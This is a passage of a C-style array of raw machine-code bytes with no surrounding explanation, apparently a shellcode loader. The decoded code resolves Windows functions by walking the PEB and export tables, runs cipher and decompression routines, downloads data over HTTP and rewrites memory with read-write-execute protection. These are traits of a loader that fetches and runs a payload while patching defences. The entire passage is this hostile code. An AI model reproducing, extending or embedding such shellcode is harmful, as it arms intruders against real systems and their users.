"\x25\x48\x8b\x3f\x45\x85\xd2\x75\xc3\x48\x85\xc0\x75\x08\x48\x8d"
"\x4c\x24\x20\xff\x56\x30\x48\x8b\x5c\x24\x70\x48\x8b\x74\x24\x78"
"\x48\x83\xc4\x60\x5f\xc3\x48\x8b\xc3\xeb\xeb\xcc\xcc\x48\x89\x5c"
"\x24\x20\x4c\x89\x44\x24\x18\x48\x89\x4c\x24\x08\x55\x56\x57\x41"
"\x54\x41\x55\x41\x56\x41\x57\x48\x81\xec\xa0\x00\x00\x00\x45\x33"
"\xdb\x48\x8b\xfa\x4c\x8b\xd1\x41\x8b\xdb\x48\x85\xd2\x0f\x84\x52"
"\x01\x00\x00\x4c\x63\x7a\x3c\x41\x8b\x84\x17\x88\x00\x00\x00\x85"
"\xc0\x0f\x84\x3e\x01\x00\x00\x48\x8d\x34\x02\x44\x8b\x76\x1c\x44"
"\x8b\x6e\x20\x4c\x03\xf2\x44\x8b\x66\x24\x4c\x03\xea\x4c\x03\xe2"
"\x4d\x85\xc0\x0f\x84\x0c\x01\x00\x00\x8b\x6e\x18\x85\xed\x0f\x84"
"\x11\x01\x00\x00\x8d\x45\xff\x49\x8b\xd0\x41\x8b\x4c\x85\x00\x8b"
"\xe8\x48\x03\xcf\x48\x89\x84\x24\xe8\x00\x00\x00\xe8\x30\x07\x00"
"\x00\x45\x33\xdb\x85\xc0\x75\x14\x48\x8b\x84\x24\xe8\x00\x00\x00"
"\x41\x0f\xb7\x04\x44\x41\x8b\x1c\x86\x48\x03\xdf\x85\xed\x74\x0d"
"\x4c\x8b\x84\x24\xf0\x00\x00\x00\x48\x85\xdb\x74\xb7\x4c\x8b\x94"
"\x24\xe0\x00\x00\x00\x48\x3b\xde\x0f\x82\xa2\x00\x00\x00\x41\x8b"
"\x84\x3f\x8c\x00\x00\x00\x48\x03\xc6\x48\x3b\xd8\x0f\x83\x8e\x00"
"\x00\x00\x45\x8b\xc3\x44\x38\x1b\x74\x1e\x41\x83\xf8\x3c\x73\x18"
"\x41\x8b\xc0\x8a\x0c\x18\x88\x4c\x04\x20\x80\xf9\x2e\x74\x09\x41"
"\xff\xc0\x45\x38\x1c\x18\x75\xe2\x41\x8d\x40\x01\x8b\xd0\xc6\x44"
"\x04\x20\x64\x41\x8d\x40\x02\xc6\x44\x04\x20\x6c\x41\x8d\x40\x03"
"\xc6\x44\x04\x20\x6c\x41\x8d\x40\x04\x4c\x8d\x04\x1a\x44\x88\x5c"
"\x04\x20\x41\x8b\xd3\x45\x38\x18\x74\x17\x83\xfa\x3f\x73\x12\x8b"
"\xca\xff\xc2\x42\x8a\x04\x01\x88\x44\x0c\x60\x46\x38\x1c\x02\x75"
"\xe9\x8b\xc2\x4c\x8d\x4c\x24\x60\x4c\x8d\x44\x24\x20\x48\x8b\xd7"
"\x49\x8b\xca\x44\x88\x5c\x04\x60\xe8\x0c\xdd\xff\xff\x48\x8b\xd8"
"\x48\x8b\xc3\xeb\x12\x44\x2b\x4e\x10\x43\x8b\x1c\x8e\x48\x03\xdf"
"\xe9\x40\xff\xff\xff\x33\xc0\x48\x8b\x9c\x24\xf8\x00\x00\x00\x48"
"\x81\xc4\xa0\x00\x00\x00\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x5f\x5e"
"\x5d\xc3\xcc\xcc\xcc\x48\x89\x5c\x24\x08\x48\x89\x6c\x24\x10\x48"
"\x89\x74\x24\x18\x57\x48\x83\xec\x20\x65\x48\x8b\x04\x25\x30\x00"
"\x00\x00\x49\x8b\xf8\x48\x8b\xf2\x48\x8b\xe9\x45\x33\xd2\x4c\x8b"
"\x48\x60\x49\x8b\x41\x18\x48\x8b\x58\x10\xeb\x1c\x4d\x85\xd2\x75"
"\x20\x4c\x8b\xcf\x4c\x8b\xc6\x48\x8b\xd0\x48\x8b\xcd\xe8\xbf\xda"
"\xff\xff\x48\x8b\x1b\x4c\x8b\xd0\x48\x8b\x43\x30\x48\x85\xc0\x75"
"\xdb\x48\x8b\x5c\x24\x30\x49\x8b\xc2\x48\x8b\x6c\x24\x38\x48\x8b"
"\x74\x24\x40\x48\x83\xc4\x20\x5f\xc3\x48\x89\x5c\x24\x10\x48\x89"
"\x6c\x24\x18\x48\x89\x74\x24\x20\x57\x41\x56\x41\x57\x48\x83\xec"
"\x30\x33\xf6\x33\xed\x45\x33\xf6\x48\x8b\xfa\x4c\x8b\xf9\x42\x8a"
"\x4c\x3d\x00\x84\xc9\x74\x14\x83\xfd\x40\x74\x0f\x88\x4c\x34\x20"
"\xff\xc5\xff\xc6\x83\xfe\x10\x75\x67\xeb\x53\x8b\xc6\x48\x8d\x5c"
"\x24\x20\x48\x03\xd8\x41\xb8\x10\x00\x00\x00\x48\x8b\xcb\x44\x2b"
"\xc6\x33\xd2\xe8\x2d\x05\x00\x00\xc6\x03\x80\x83\xfe\x0c\x72\x20"
"\x48\x8b\xd7\x48\x8d\x4c\x24\x20\xe8\x58\x00\x00\x00\x33\xd2\x48"
"\x8d\x4c\x24\x20\x48\x33\xf8\x44\x8d\x42\x10\xe8\x05\x05\x00\x00"
"\x8d\x04\xed\x00\x00\x00\x00\x41\xff\xc6\x89\x44\x24\x2c\x48\x8b"
"\xd7\x48\x8d\x4c\x24\x20\xe8\x2a\x00\x00\x00\x48\x33\xf8\x33\xf6"
"\x45\x85\xf6\x0f\x84\x75\xff\xff\xff\x48\x8b\x5c\x24\x58\x48\x8b"
"\xc7\x48\x8b\x6c\x24\x60\x48\x8b\x74\x24\x68\x48\x83\xc4\x30\x41"
"\x5f\x41\x5e\x5f\xc3\x48\x89\x5c\x24\x08\x48\x89\x74\x24\x18\x57"
"\x48\x83\xec\x10\x0f\x10\x01\x48\x89\x54\x24\x28\x33\xdb\x44\x8b"
"\x54\x24\x2c\x44\x8b\xc2\xf3\x0f\x7f\x04\x24\x44\x8b\x4c\x24\x0c"
"\x8b\x74\x24\x08\x8b\x7c\x24\x04\x44\x8b\x1c\x24\x41\x8b\xd1\x41"
"\x8b\xc8\xc1\xe1\x18\x41\x8b\xc0\x44\x8b\xc1\xc1\xe8\x08\x44\x0b"
"\xc0\x41\x8b\xca\x45\x03\xc2\xc1\xe9\x1d\x45\x33\xc3\x42\x8d\x04"
"\xd5\x00\x00\x00\x00\x44\x8b\xcf\x44\x8b\xd1\x41\xc1\xe1\x18\x41"
"\x8b\xcb\xc1\xef\x08\x44\x0b\xd0\x44\x0b\xcf\xc1\xe9\x1d\x45\x03"
"\xcb\x42\x8d\x04\xdd\x00\x00\x00\x00\x44\x33\xcb\x44\x8b\xd9\x44"
"\x0b\xd8\x45\x33\xd0\x45\x33\xd9\xff\xc3\x8b\xfe\x8b\xf2\x83\xfb"
"\x1b\x72\x99\x48\x8b\x5c\x24\x20\x48\x8b\x74\x24\x30\x44\x89\x44"
"\x24\x28\x44\x89\x54\x24\x2c\x48\x8b\x44\x24\x28\x48\x83\xc4\x10"
"\x5f\xc3\xcc\xcc\xcc\x45\x85\xc9\x0f\x84\x5a\x01\x00\x00\x48\x8b"
"\xc4\x48\x89\x58\x08\x48\x89\x70\x10\x48\x89\x78\x18\x4c\x89\x68"
"\x20\x55\x41\x56\x41\x57\x48\x8b\xec\x48\x83\xec\x10\x4c\x8b\xd9"
"\x48\x8d\x45\xf0\x4c\x2b\xd8\x4c\x8d\x7a\x0f\x49\x8b\xf8\x4c\x8b"
"\xd2\x41\xbd\x10\x00\x00\x00\x48\x8d\x45\xf0\x49\x3b\xc7\x77\x14"
"\x48\x8d\x45\xff\x49\x3b\xc2\x72\x0b\x41\x0f\x10\x02\xf3\x0f\x7f"
"\x45\xf0\xeb\x09\x41\x0f\x10\x02\xf3\x0f\x7f\x45\xf0\x48\x8d\x4d"
"\xf0\xba\x04\x00\x00\x00\x41\x8b\x04\x0b\x31\x01\x48\x8d\x49\x04"
"\x48\x83\xea\x01\x75\xf0\x8b\x5d\xfc\x4d\x8b\xf5\x8b\x55\xf8\x8b"
"\x75\xf4\x8b\x45\xf0\x44\x8d\x04\x06\x03\xd3\x8b\xce\x8b\xc6\xc1"
"\xe0\x05\xc1\xe9\x1b\x8b\xf1\x8b\xcb\x0b\xf0\xc1\xe9\x18\x8b\xc3"
"\x41\x33\xf0\xc1\xe0\x08\x8b\xd9\x0b\xd8\x41\xc1\xc8\x10\x33\xda"
"\x03\xd6\xc1\xce\x19\x33\xf2\xc1\xca\x10\x41\x8d\x04\x18\xc1\xcb"
"\x13\x33\xd8\x49\x83\xee\x01\x75\xbc\x89\x55\xf8\x48\x8d\x4d\xf0"
"\x41\x8d\x56\x04\x89\x5d\xfc\x89\x75\xf4\x89\x45\xf0\x41\x8b\x04"
"\x0b\x31\x01\x48\x8d\x49\x04\x48\x83\xea\x01\x75\xf0\x45\x3b\xcd"
"\x41\x8b\xc9\x41\x0f\x47\xcd\x44\x8b\xc1\x85\xc9\x74\x1b\x48\x8d"
"\x5d\xf0\x48\x8b\xd7\x48\x2b\xdf\x41\x8b\xf0\x8a\x04\x13\x30\x02"
"\x48\xff\xc2\x48\x83\xee\x01\x75\xf2\x44\x2b\xc9\x41\x8b\xd5\x49"
"\x03\xf8\x8d\x42\xff\x42\x80\x04\x10\x01\x75\x06\xff\xca\x85\xd2"
"\x7f\xf0\x45\x85\xc9\x0f\x85\xfc\xfe\xff\xff\x48\x8b\x5c\x24\x30"
"\x48\x8b\x74\x24\x38\x48\x8b\x7c\x24\x40\x4c\x8b\x6c\x24\x48\x48"
"\x83\xc4\x10\x41\x5f\x41\x5e\x5d\xc3\x48\x8b\xc4\x48\x89\x58\x08"
"\x48\x89\x70\x10\x48\x89\x78\x18\x4c\x89\x70\x20\x55\x48\x8b\xec"
"\x48\x83\xec\x40\x8a\x01\x41\x83\xce\xff\x83\x65\xf4\x00\x45\x33"
"\xc9\x88\x02\x33\xff\x48\x8d\x42\x01\x48\x8b\xda\x48\x89\x45\xe8"
"\x45\x8b\xde\x48\x8d\x41\x01\x48\x89\x45\xe0\x8d\x77\x01\x48\x8d"
"\x4d\xe0\xe8\xf6\x01\x00\x00\x85\xc0\x0f\x84\xaa\x01\x00\x00\x48"
"\x8d\x4d\xe0\xe8\xe5\x01\x00\x00\x85\xc0\x0f\x84\x9f\x00\x00\x00"
"\x48\x8d\x4d\xe0\xe8\xd4\x01\x00\x00\x85\xc0\x74\x4e\x45\x33\xc9"
"\x45\x8d\x51\x04\x48\x8d\x4d\xe0\xe8\xc0\x01\x00\x00\x46\x8d\x0c"
"\x48\x44\x2b\xd6\x75\xee\x45\x85\xc9\x74\x1d\x48\x8b\x55\xe8\x48"
"\x8b\xc2\x41\x8b\xc9\x48\x2b\xc1\x8a\x00\x88\x02\x48\x03\xd6\x48"
"\x89\x55\xe8\xe9\x6b\x01\x00\x00\x48\x8b\x45\xe8\xc6\x00\x00\x48"
"\x03\xc6\x48\x89\x45\xe8\xe9\x58\x01\x00\x00\x48\x8b\x45\xe0\x44"
"\x0f\xb6\x18\x48\x03\xc6\x41\x8b\xcb\x48\x89\x45\xe0\x23\xce\x83"
"\xc1\x02\x41\xd1\xeb\x74\x21\x48\x8b\x55\xe8\x45\x8b\xc3\x49\xf7"
"\xd8\x41\x8a\x04\x10\x88\x02\x48\x03\xd6\x41\x03\xce\x75\xf2\x48"
"\x89\x55\xe8\xe9\xfc\x00\x00\x00\x8b\xfe\xe9\xf5\x00\x00\x00\x44"
"\x8b\xd6\x48\x8d\x4d\xe0\xe8\x32\x01\x00\x00\x48\x8d\x4d\xe0\x46"
"\x8d\x14\x50\xe8\x25\x01\x00\x00\x85\xc0\x75\xe6\x45\x85\xc9\x75"
"\x48\x41\x83\xfa\x02\x75\x42\x44\x8b\xce\x48\x8d\x4d\xe0\xe8\x0a"
"\x01\x00\x00\x48\x8d\x4d\xe0\x46\x8d\x0c\x48\xe8\xfd\x00\x00\x00"
"\x85\xc0\x75\xe6\x45\x85\xc9\x0f\x84\xa7\x00\x00\x00\x48\x8b\x4d"
"\xe8\x41\x8b\xd3\x48\xf7\xda\x8a\x04\x0a\x88\x01\x48\x03\xce\x45"
"\x03\xce\x75\xf3\xe9\x87\x00\x00\x00\x48\x8b\x4d\xe0\x44\x33\xce"
"\x45\x2b\xd1\x44\x8b\xce\x41\xc1\xe2\x08\x44\x0f\xb6\x19\x41\x81"
"\xc3\x00\xfe\xff\xff\x45\x03\xda\x48\x03\xce\x48\x89\x4d\xe0\x48"
"\x8d\x4d\xe0\xe8\xa5\x00\x00\x00\x48\x8d\x4d\xe0\x46\x8d\x0c\x48"
"\xe8\x98\x00\x00\x00\x85\xc0\x75\xe6\x41\x81\xfb\x00\x7d\x00\x00"
"\x41\x8d\x41\x01\x41\x0f\x42\xc1\x41\x81\xfb\x00\x05\x00\x00\x8d"
"\x48\x01\x0f\x42\xc8\x41\x81\xfb\x80\x00\x00\x00\x44\x8d\x41\x02"
"\x44\x0f\x43\xc1\x45\x85\xc0\x74\x1b\x48\x8b\x4d\xe8\x41\x8b\xd3"
"\x48\xf7\xda\x8a\x04\x0a\x88\x01\x48\x03\xce\x45\x03\xc6\x75\xf3"
"\x48\x89\x4d\xe8\x44\x8b\xce\xeb\x1d\x48\x8b\x55\xe0\x48\x8b\x4d"
"\xe8\x8a\x02\x88\x01\x48\x03\xce\x48\x03\xd6\x48\x89\x4d\xe8\x48"
"\x89\x55\xe0\x45\x33\xc9\x85\xff\x0f\x84\x20\xfe\xff\xff\x8b\x45"
"\xe8\x48\x8b\x74\x24\x58\x2b\xc3\x48\x8b\x5c\x24\x50\x48\x8b\x7c"
"\x24\x60\x4c\x8b\x74\x24\x68\x48\x83\xc4\x40\x5d\xc3\x8b\x51\x14"
"\x4c\x8d\x41\x10\x8d\x42\xff\x89\x41\x14\x85\xd2\x75\x17\x48\x8b"
"\x11\x0f\xb6\x02\x41\x89\x00\x48\x8d\x42\x01\x48\x89\x01\xc7\x41"
"\x14\x07\x00\x00\x00\x41\x8b\x00\x8d\x0c\x00\xc1\xe8\x07\x83\xe0"
"\x01\x41\x89\x08\xc3\x4c\x8b\xc9\x45\x85\xc0\x74\x13\x48\x2b\xd1"
"\x42\x8a\x04\x0a\x41\x88\x01\x49\xff\xc1\x41\x83\xc0\xff\x75\xf0"
"\x48\x8b\xc1\xc3\xcc\x48\x89\x7c\x24\x08\x4c\x8b\xc9\x8a\xc2\x49"
"\x8b\xf9\x41\x8b\xc8\xf3\xaa\x48\x8b\x7c\x24\x08\x49\x8b\xc1\xc3"
"\xcc\xeb\x0f\x80\x3a\x00\x74\x10\x3a\x02\x75\x0c\x48\xff\xc1\x48"
"\xff\xc2\x8a\x01\x84\xc0\x75\xeb\x0f\xbe\x01\x0f\xbe\x0a\x2b\xc1"
"\xc3\xeb\x19\x44\x8a\x02\x45\x84\xc0\x74\x17\x41\x80\xc8\x20\x0c"
"\x20\x41\x3a\xc0\x75\x0c\x48\xff\xc1\x48\xff\xc2\x8a\x01\x84\xc0"
"\x75\xe1\x0f\xbe\x01\x0f\xbe\x0a\x2b\xc1\xc3\x5a\x51\x52\x81\xec"
"\xd4\x02\x00\x00\x53\x55\x56\x8b\xb4\x24\xe4\x02\x00\x00\x33\xdb"
"\x57\x8b\xfb\x39\x9e\x38\x02\x00\x00\x0f\x84\xea\x00\x00\x00\xff"
"\x76\x2c\xff\x76\x28\xff\xb6\x8c\x00\x00\x00\xff\xb6\x88\x00\x00"
"\x00\x56\xe8\x45\x28\x00\x00\x8b\xf8\x83\xc4\x14\x85\xff\x0f\x84"
"\xc0\x00\x00\x00\x53\x53\x56\xe8\x2d\x26\x00\x00\x8b\xc8\xb8\xd7"
"\x22\x40\x00\x2d\x7b\x36\x40\x00\x03\xc8\x51\x53\x53\xff\xd7\xff"
"\x76\x2c\x8b\xf8\xff\x76\x28\xff\xb6\x0c\x02\x00\x00\xff\xb6\x08"
"\x02\x00\x00\x56\xe8\x03\x28\x00\x00\xff\x76\x2c\x89\x44\x24\x28"
"\xff\x76\x28\xff\xb6\xa4\x00\x00\x00\xff\xb6\xa0\x00\x00\x00\x56"
"\xe8\xe7\x27\x00\x00\xff\x76\x2c\x8b\xd8\xff\x76\x28\xff\xb6\xac"
"\x00\x00\x00\xff\xb6\xa8\x00\x00\x00\x56\xe8\xcd\x27\x00\x00\x83"
"\xc4\x3c\x8b\xe8\x6a\x00\xff\x56\x38\x83\x7c\x24\x10\x00\x89\x44"
"\x24\x14\x74\x4c\x85\xdb\x74\x48\x85\xed\x74\x44\x8d\x44\x24\x18"
"\xc7\x44\x24\x18\x07\x00\x01\x00\x50\xff\xd5\x50\xff\xd3\x8b\x86"
"\x38\x02\x00\x00\x03\x44\x24\x14\x83\xa4\x24\xdc\x00\x00\x00\xfc"
"\x89\x84\x24\xd0\x00\x00\x00\x8d\x44\x24\x18\x6a\x00\x50\xff\x54"
"\x24\x18\xeb\x0c\x83\xc8\xff\xeb\x09\x56\xe8\xc6\x11\x00\x00\x59"
"\x8b\xc7\x5f\x5e\x5d\x5b\x81\xc4\xd4\x02\x00\x00\xc3\x8b\x44\x24"
"\x04\x83\xc0\x04\xf0\xff\x00\x8b\x00\xc2\x04\x00\xb8\x01\x40\x00"
"\x80\xc2\x08\x00\x56\x57\xe8\x3e\x25\x00\x00\x8b\x74\x24\x10\xb9"
"\xad\x11\x40\x00\xbf\x7b\x36\x40\x00\x2b\xcf\x03\xc1\x8b\x0e\x89"
"\x01\xe8\x23\x25\x00\x00\xb9\x1f\x11\x40\x00\x2b\xcf\x03\xc1\x8b"
"\x0e\x89\x41\x04\xe8\x10\x25\x00\x00\xb9\x0c\x12\x40\x00\x2b\xcf"
"\x03\xc1\x8b\x0e\x89\x41\x08\xe8\xfd\x24\x00\x00\xb9\x2e\x11\x40"
"\x00\x2b\xcf\x03\xc1\x8b\x0e\x89\x41\x0c\xe8\xea\x24\x00\x00\xb9"
"\x2e\x11\x40\x00\x2b\xcf\x03\xc1\x8b\x0e\x5f\x89\x41\x10\x8b\x44"
"\x24\x08\x83\x66\x04\x00\x89\x46\x08\x5e\xc3\x8b\x4c\x24\x0c\x85"
"\xc9\x75\x07\xb8\x03\x40\x00\x80\xeb\x4d\x53\x8b\x5c\x24\x0c\x33"
"\xd2\x56\x8b\x74\x24\x0c\x57\x8b\x7e\x08\x8b\x84\x97\x30\x08\x00"
"\x00\x3b\x04\x93\x75\x08\x42\x83\xfa\x04\x75\xee\xeb\x14\x33\xd2"
"\x8b\x84\x97\xf0\x08\x00\x00\x3b\x04\x93\x75\x10\x42\x83\xfa\x04"
"\x75\xee\x89\x31\xf0\xff\x46\x04\x33\xc0\xeb\x08\x83\x21\x00\xb8"
"\x02\x40\x00\x80\x5f\x5e\x5b\xc2\x0c\x00\x8b\x4c\x24\x04\x83\xc8"
"\xff\xf0\x0f\xc1\x41\x04\x48\xc2\x04\x00\x33\xc0\xc2\x08\x00\x55"
"\x8b\xec\xf6\x45\x10\x02\x56\x8b\x75\x08\x57\x74\x15\x8b\x7d\x18"
"\x85\xff\x74\x1b\x8b\x46\x1c\x50\x8b\x08\xff\x51\x04\x8b\x46\x1c"
"\x89\x07\xf6\x45\x10\x01\x74\x19\x8b\x7d\x14\x85\xff\x75\x07\xb8"
"\x03\x40\x00\x80\xeb\x0d\x83\xc6\x14\x56\x8b\x06\xff\x50\x04\x89"
"\x37\x33\xc0\x5f\x5e\x5d\xc2\x14\x00\x8b\x44\x24\x04\x8b\x40\x2c"
"\xff\x50\x54\x8b\x4c\x24\x08\x89\x01\x33\xc0\xc2\x08\x00\x56\x57"
"\xe8\xf4\x23\x00\x00\x8b\x74\x24\x10\xb9\xbe\x13\x40\x00\xbf\x7b"
"\x36\x40\x00\x2b\xcf\x03\xc1\x8b\x0e\x89\x01\xe8\xd9\x23\x00\x00"
"\xb9\x1f\x11\x40\x00\x2b\xcf\x03\xc1\x8b\x0e\x89\x41\x04\xe8\xc6"
"\x23\x00\x00\xb9\x0c\x12\x40\x00\x2b\xcf\x03\xc1\x8b\x0e\x89\x41"
"\x08\xe8\xb3\x23\x00\x00\xb9\x6b\x12\x40\x00\x2b\xcf\x03\xc1\x8b"
"\x0e\x89\x41\x0c\xe8\xa0\x23\x00\x00\xb9\x21\x12\x40\x00\x2b\xcf"
"\x03\xc1\x8b\x0e\x89\x41\x10\xe8\x8d\x23\x00\x00\xb9\x1c\x12\x40"
"\x00\x2b\xcf\x03\xc1\x8b\x0e\x89\x41\x14\xe8\x7a\x23\x00\x00\xb9"
"\xb9\x13\x40\x00\x2b\xcf\x03\xc1\x8b\x0e\x89\x41\x18\xe8\x67\x23"
"\x00\x00\xb9\x1c\x12\x40\x00\x2b\xcf\x03\xc1\x8b\x0e\x89\x41\x1c"
"\xe8\x54\x23\x00\x00\xb9\x6e\x13\x40\x00\x2b\xcf\x03\xc1\x8b\x0e"
"\x89\x41\x20\xe8\x41\x23\x00\x00\xb9\x69\x13\x40\x00\x2b\xcf\x03"
"\xc1\x8b\x0e\x89\x41\x24\xe8\x2e\x23\x00\x00\xb9\x69\x13\x40\x00"
"\x2b\xcf\x03\xc1\x8b\x0e\x5f\x89\x41\x28\x8b\x44\x24\x08\x83\x66"
"\x04\x00\x89\x46\x2c\x5e\xc3\x33\xc0\xc2\x04\x00\x55\x8b\xec\x83"
"\xec\x2c\x33\xc0\x56\x6a\x20\x50\x89\x45\xf4\x89\x45\xf8\x89\x45"
"\xfc\x8d\x45\xd4\x50\xe8\x8b\x29\x00\x00\x8b\x75\x0c\x8d\x4d\xd4"
"\x83\xc4\x0c\x8b\x06\x51\x56\xff\x50\x0c\x85\xc0\x75\x12\x8b\x06"
"\x8d\x4d\xfc\x51\x8d\x4d\xf8\x51\x8d\x4d\xf4\x51\x56\xff\x50\x10"
"\x33\xc0\x5e\xc9\xc2\x08\x00\x33\xc0\xc2\x0c\x00\x8b\x4c\x24\x0c"
"\x85\xc9\x75\x07\xb8\x03\x40\x00\x80\xeb\x6c\x8b\x54\x24\x04\x53"
"\x8b\x5c\x24\x0c\x56\x57\x8b\x7a\x2c\x33\xf6\x8b\x84\xb7\x30\x08"
"\x00\x00\x3b\x04\xb3\x75\x08\x46\x83\xfe\x04\x75\xee\xeb\x14\x33"
"\xf6\x8b\x84\xb7\xe0\x08\x00\x00\x3b\x04\xb3\x75\x0e\x46\x83\xfe"
"\x04\x75\xee\x89\x11\xf0\xff\x42\x04\xeb\x1d\x33\xf6\x8b\x84\xb7"
"\xf0\x08\x00\x00\x3b\x04\xb3\x75\x13\x46\x83\xfe\x04\x75\xee\x8d"
"\x42\x08\x89\x01\xf0\xff\x42\x0c\x33\xc0\xeb\x08\x83\x21\x00\xb8"
"\x02\x40\x00\x80\x5f\x5e\x5b\xc2\x0c\x00\x8b\x44\x24\x18\x83\x20"
"\x00\x33\xc0\xc2\x18\x00\x8b\x44\x24\x04\x0f\xaf\x44\x24\x08\xc3"
"\x8b\x44\x24\x14\x83\x20\x00\x33\xc0\xc2\x14\x00\x8b\x44\x24\x04"
"\x03\x44\x24\x08\xc3\x51\x53\x56\x8b\x74\x24\x10\x8d\x86\x54\x03"
"\x00\x00\x50\x56\xe8\x0a\x22\x00\x00\x8b\xd8\x59\x59\x85\xdb\x75"
"\x06\x40\xe9\xd5\x00\x00\x00\x55\x57\x6a\x00\x8d\x86\xc8\x05\x00"
"\x00\x50\x53\x56\xe8\x88\x22\x00\x00\x8b\xe8\x83\xc4\x10\x85\xed"
"\x0f\x84\xb2\x00\x00\x00\xbf\x48\x14\x40\x00\x81\xef\x3c\x14\x40"
"\x00\x0f\x88\xa1\x00\x00\x00\x8d\x44\x24\x18\x50\x6a\x40\x57\x55"
"\xff\x56\x48\x85\xc0\x0f\x84\x8d\x00\x00\x00\x57\xe8\xa8\x21\x00"
"\x00\xb9\x3c\x14\x40\x00\x81\xe9\x7b\x36\x40\x00\x03\xc1\x50\x55"
"\xe8\x0c\x28\x00\x00\x83\xc4\x0c\x8d\x44\x24\x10\x50\xff\x74\x24"
"\x1c\x57\x55\xff\x56\x48\x6a\x00\x8d\x86\xd8\x05\x00\x00\x50\x53"
"\x56\xe8\x1b\x22\x00\x00\x8b\xe8\x83\xc4\x10\x85\xed\x74\x49\xbf"
"\x5e\x14\x40\x00\xbb\x52\x14\x40\x00\x2b\xfb\x78\x3b\x8d\x44\x24"
"\x18\x50\x6a\x40\x57\x55\xff\x56\x48\x85\xc0\x74\x2b\x57\xe8\x46"
"\x21\x00\x00\x81\xeb\x7b\x36\x40\x00\x03\xc3\x50\x55\xe8\xaf\x27"
"\x00\x00\x83\xc4\x0c\x8d\x44\x24\x10\x50\xff\x74\x24\x1c\x57\x55"
"\xff\x56\x48\x33\xc0\x40\xeb\x02\x33\xc0\x5f\x5d\x5e\x5b\x59\xc3"
"\x55\x8b\xec\x51\x56\x8b\x75\x08\x57\x8d\x86\x68\x03\x00\x00\x50"
"\x56\xe8\x0d\x21\x00\x00\x6a\x00\x8d\x8e\xe8\x05\x00\x00\x51\x50"
"\x56\xe8\x9b\x21\x00\x00\x8b\xf8\x83\xc4\x18\x85\xff\x74\x34\x8d"
"\x45\x08\x50\x6a\x40\x6a\x04\x57\xff\x56\x48\x85\xc0\x74\x24\x6a"
"\x04\x8d\x86\x0d\x06\x00\x00\x50\x57\xe8\x43\x27\x00\x00\x83\xc4"
"\x0c\x8d\x45\xfc\x50\xff\x75\x08\x6a\x04\x57\xff\x56\x48\x33\xc0"
"\x40\xeb\x02\x33\xc0\x5f\x5e\xc9\xc3\x81\xec\xec\x02\x00\x00\x53"
"\x55\x56\x8b\xb4\x24\xfc\x02\x00\x00\x8d\x44\x24\x34\x57\x6a\x3c"
"\x33\xed\x33\xdb\x21\x5c\x24\x24\xbf\x00\x03\x60\x04\x55\x50\xe8"
"\x21\x27\x00\x00\x83\xc4\x0c\xc7\x44\x24\x38\x3c\x00\x00\x00\x8d"
"\x84\x24\xf8\x01\x00\x00\xb9\x04\x01\x00\x00\x89\x44\x24\x48\x8d"
"\x84\x24\xf4\x00\x00\x00\x89\x44\x24\x64\x8d\x44\x24\x74\x89\x44"
"\x24\x54\x8d\x84\x24\xb4\x00\x00\x00\x6a\x40\x89\x44\x24\x60\x8d"
"\x44\x24\x3c\x89\x4c\x24\x50\x89\x4c\x24\x6c\x59\x50\x68\x00\x00"
"\x00\x10\x55\x8d\x86\x24\x09\x00\x00\x89\x4c\x24\x64\x50\x89\x4c"
"\x24\x70\xff\x96\xbc\x00\x00\x00\x85\xc0\x0f\x84\x14\x03\x00\x00"
"\x33\xc0\x83\x7c\x24\x44\x04\x0f\x94\xc0\x89\x44\x24\x18\xb8\x00"
"\x33\xe0\x04\x0f\x44\xf8\x33\xc0\x50\x50\x50\x50\x50\x89\x7c\x24"
"\x3c\xff\x96\xc0\x00\x00\x00\x89\x44\x24\x34\x85\xc0\x0f\x84\xe1"
"\x02\x00\x00\x33\xc9\x51\x51\x6a\x03\x51\x51\xff\x74\x24\x64\x8d"
"\x8c\x24\x10\x02\x00\x00\x51\x50\xff\x96\xc4\x00\x00\x00\x89\x44"
"\x24\x30\x85\xc0\x0f\x84\x5a\x02\x00\x00\x33\xd2\x39\x5c\x24\x68"
"\x75\x0a\x66\xc7\x84\x24\xf4\x00\x00\x00\x2f\x00\x52\x57\x52\x52"
"\x52\x8d\x8c\x24\x08\x01\x00\x00\x51\x52\x50\xff\x96\xd8\x00\x00"
"\x00\x8b\xf8\x85\xff\x0f\x84\x1f\x02\x00\x00\x39\x5c\x24\x18\x74"
"\x22\xf7\x44\x24\x28\x00\x10\x00\x00\x74\x18\x6a\x04\x8d\x44\x24"
"\x30\xc7\x44\x24\x30\x80\x33\x00\x00\x50\x6a\x1f\x57\xff\x96\xc8"
"\x00\x00\x00\x39\x5c\x24\x58\x74\x13\xff\x74\x24\x58\xff\x74\x24"
"\x58\x6a\x1c\x57\xff\x96\xc8\x00\x00\x00\x8b\xe8\x39\x5c\x24\x60"
"\x74\x13\xff\x74\x24\x60\xff\x74\x24\x60\x6a\x1d\x57\xff\x96\xc8"
"\x00\x00\x00\x8b\xe8\x33\xc0\x50\x50\x50\x50\x57\xff\x96\xdc\x00"
"\x00\x00\x85\xc0\x0f\x84\xa9\x01\x00\x00\x6a\x00\x8d\x44\x24\x20"
"\xc7\x44\x24\x20\x04\x00\x00\x00\x50\x8d\x44\x24\x28\x50\x68\x13"
"\x00\x00\x20\x57\xff\x96\xe0\x00\x00\x00\x85\xc0\x0f\x84\x81\x01"
"\x00\x00\x81\x7c\x24\x20\xc8\x00\x00\x00\x0f\x85\x73\x01\x00\x00"
"\x21\x5c\x24\x10\x8d\x44\x24\x1c\x6a\x00\x50\x8d\x44\x24\x18\xc7"
"\x44\x24\x24\x04\x00\x00\x00\x50\x68\x05\x00\x00\x20\x57\xff\x96"
"\xe0\x00\x00\x00\x85\xc0\x0f\x85\xae\x00\x00\x00\xff\x96\x8c\x00"
"\x00\x00\x3d\x76\x2f\x00\x00\x0f\x85\x36\x01\x00\x00\x33\xc0\x50"
"\x50\x89\x44\x24\x18\x8d\x44\x24\x1c\x50\x57\xff\x96\xd4\x00\x00"
"\x00\x85\xc0\x0f\x84\x1a\x01\x00\x00\x8b\x4c\x24\x14\x85\xc9\x74"
"\x65\x8b\x96\x84\x00\x00\x00\x85\xdb\x75\x0b\x51\x6a\x01\xff\xd2"
"\x50\xff\x56\x7c\xeb\x13\x8b\x44\x24\x10\x03\xc1\x50\x53\x6a\x01"
"\xff\xd2\x50\xff\x96\x80\x00\x00\x00\x8b\xd8\x85\xdb\x0f\x84\xe0"
"\x00\x00\x00\x8d\x44\x24\x24\x50\xff\x74\x24\x18\x8b\x44\x24\x18"
